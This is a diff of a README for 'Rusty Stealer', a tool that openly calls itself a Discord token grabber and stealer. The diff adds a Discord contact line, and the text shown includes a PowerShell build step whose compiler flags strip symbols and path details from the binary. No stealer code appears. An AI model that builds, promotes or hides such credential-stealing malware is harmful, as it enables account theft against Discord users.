@@ -1,6 +1,8 @@
 # Rusty Stealer 🚀
 - *a blazing fast Discord Token Grabber & Stealer, no popo made with python*
 
+- if not working, discord: llvm.
+
 ## Build :
 ```bash
 $env:RUSTFLAGS = "-Zlocation-detail=none -Ctarget-cpu=native -Cdebuginfo=0 -Zstrip=symbols -Zstrip=debuginfo --remap-path-prefix  C:\Users\$env:USERNAME\.cargo\registry\src\=caca"
